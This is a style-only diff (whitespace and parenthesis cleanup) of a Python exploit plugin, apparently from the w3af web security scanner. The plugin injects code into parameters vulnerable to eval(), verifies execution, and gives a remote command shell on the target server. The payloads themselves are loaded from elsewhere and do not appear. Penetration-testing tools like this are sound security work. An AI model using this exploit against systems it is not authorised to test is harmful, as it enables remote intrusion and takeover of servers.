@@ -31,47 +31,47 @@ from plugins.attack.payloads.decorators.exec_decorator import exec_debug
 class eval(AttackPlugin):
     '''
     Exploit eval() vulnerabilities.
-    
+
     @author: Andres Riancho (andres.riancho@gmail.com)
     '''
 
     def __init__(self):
         AttackPlugin.__init__(self)
-        
+
         # Internal variables
         self._shell_code = None
-        
+
     def get_attack_type(self):
         '''
         @return: The type of exploit, SHELL, PROXY, etc.
-        '''        
+        '''
         return 'shell'
-    
-    def get_kb_location( self ):
+
+    def get_kb_location(self):
         '''
         This method should return the vulnerability name (as saved in the kb)
         to exploit. For example, if the audit.os_commanding plugin finds an
         vuln, and saves it as:
-        
+
         kb.kb.append( 'os_commanding' , 'os_commanding', vuln )
-        
+
         Then the exploit plugin that exploits os_commanding
         ( attack.os_commanding ) should return 'os_commanding' in this method.
         '''
         return 'eval'
-        
-    def _generate_shell( self, vuln_obj ):
+
+    def _generate_shell(self, vuln_obj):
         '''
         @param vuln_obj: The vuln to exploit.
         @return: A shell object based on the vuln that is passed as parameter.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verify_vuln( vuln_obj ):
+        if self._verify_vuln(vuln_obj):
             # Create the shell object
-            shell_obj = eval_shell( vuln_obj )
-            shell_obj.set_url_opener( self._uri_opener )
-            shell_obj.set_cut( self._header_length, self._footer_length )
-            shell_obj.set_code( self._shell_code )
+            shell_obj = eval_shell(vuln_obj)
+            shell_obj.set_url_opener(self._uri_opener)
+            shell_obj.set_cut(self._header_length, self._footer_length)
+            shell_obj.set_code(self._shell_code)
             return shell_obj
         else:
             return None
@@ -86,13 +86,14 @@ class eval(AttackPlugin):
         # Get the shells
         extension = vuln_obj.getURL().getExtension()
         # I get a list of tuples with code and extension to use
-        shell_code_list = shell_handler.get_shell_code( extension )
-        
+        shell_code_list = shell_handler.get_shell_code(extension)
+
         for code, real_extension in shell_code_list:
             # Prepare for exploitation...
-            function_reference = getattr(self._uri_opener, vuln_obj.get_method())
+            function_reference = getattr(
+                self._uri_opener, vuln_obj.get_method())
             data_container = vuln_obj.get_dc()
-            data_container[ vuln_obj.get_var() ] = code
+            data_container[vuln_obj.get_var()] = code
 
             try:
                 http_res = function_reference(vuln_obj.getURL(),
@@ -103,17 +104,17 @@ class eval(AttackPlugin):
                 om.out.debug(msg % w3)
             else:
                 cut_result = self._define_exact_cut(http_res.getBody(),
-                                                    shell_handler.SHELL_IDENTIFIER )
+                                                    shell_handler.SHELL_IDENTIFIER)
                 if cut_result:
                     msg = 'Sucessfully exploited eval() vulnerability using'\
                           ' the following code snippet: "%s...".' % code[:35]
                     self._shell_code = code
                     return True
-        
+
         # All failed!
         return False
-                
-    def get_root_probability( self ):
+
+    def get_root_probability(self):
         '''
         @return: This method returns the probability of getting a root shell
                  using this attack plugin. This is used by the "exploit *"
@@ -123,21 +124,22 @@ class eval(AttackPlugin):
                  WILL ALWAYS return a root shell.
         '''
         return 0.8
-    
-    def get_long_desc( self ):
+
+    def get_long_desc(self):
         '''
         @return: A DETAILED description of the plugin functions and features.
         '''
         return '''
-        This plugin exploits eval() vulnerabilities and returns a remote shell. 
+        This plugin exploits eval() vulnerabilities and returns a remote shell.
         '''
-        
+
+
 class eval_shell(exec_shell):
-    
+
     def set_code(self, code):
         self._shell_code = code
 
-    @exec_debug    
+    @exec_debug
     def execute(self, command):
         '''
         This method executes a command in the remote operating system by
@@ -147,7 +149,7 @@ class eval_shell(exec_shell):
         @return: The result of the command.
         '''
         # Lets send the command.
-        function_reference = getattr(self._uri_opener , self.get_method())
+        function_reference = getattr(self._uri_opener, self.get_method())
         exploit_dc = self.get_dc()
         exploit_dc['cmd'] = command
         exploit_dc[self.get_var()] = self._shell_code
@@ -160,12 +162,12 @@ class eval_shell(exec_shell):
             return 'Unexpected error, please try again.'
         else:
             return shell_handler.extract_result(response.getBody())
-        
-    def end( self ):
+
+    def end(self):
         '''
         Finish execution, clean-up, clear the local web server.
         '''
         pass
-    
-    def get_name( self ):
+
+    def get_name(self):
         return 'eval_shell'
